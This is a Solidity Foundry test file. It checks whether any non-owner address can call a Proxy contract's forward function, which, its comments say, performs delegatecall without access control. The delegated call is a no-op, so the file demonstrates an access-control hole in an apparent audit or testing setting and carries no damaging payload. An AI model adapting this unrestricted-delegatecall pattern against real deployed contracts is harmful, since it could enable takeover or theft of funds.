
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

contract DelegateTarget {
    function execute() external pure {}

    receive() external payable {}

    fallback() external payable {}
}

contract TestAccessControlProxy is Test {
    Proxy proxy;
    DelegateTarget target;

    function setUp() public {
        proxy = new Proxy();
        target = new DelegateTarget();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude privileged roles
        // The 'owner' is stored at slot 0. We load it to ensure we exclude the actual owner.
        address owner = address(uint160(uint256(vm.load(address(proxy), bytes32(uint256(0))))));
        vm.assume(caller != owner);

        // --- 2. State Configuration ---
        // No specific state or funding required for this test.

        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // The 'forward' function allows arbitrary execution via delegatecall without access control.
        // We pass a valid target and data to ensure the require(success) passes.
        // If the contract is vulnerable, this call succeeds.
        proxy.forward(address(target), abi.encodeWithSelector(DelegateTarget.execute.selector));
    }

    receive() external payable {}

    fallback() external payable {}
}
